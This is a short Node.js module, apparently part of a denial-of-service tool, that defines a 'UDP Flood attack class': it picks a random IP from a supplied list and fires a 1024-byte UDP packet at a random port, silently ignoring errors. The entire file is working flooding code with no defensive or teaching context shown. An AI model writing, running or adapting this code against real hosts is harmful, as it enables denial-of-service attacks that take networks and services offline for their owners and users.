const packet = Buffer.alloc(1024);
const dgram = require('dgram');
const getRandom = require('../get-random');

/**
 * UDP Flood attack class
 */
module.exports = {
  prepare(ips) {
    return Promise.resolve(ips);
  },
  /**
   * Initiate UDP Flood
   */
  attack(ips) {
    const socket = dgram.createSocket('udp4');

    socket.on('error', () => {});

    const ip = ips[getRandom(0, ips.length - 1)];

    // In this attack we don't need open ports but just any port
    const port = getRandom(1, 65535);

    socket.send(packet, port, ip, () => {
      socket.close();
    });
  }
};
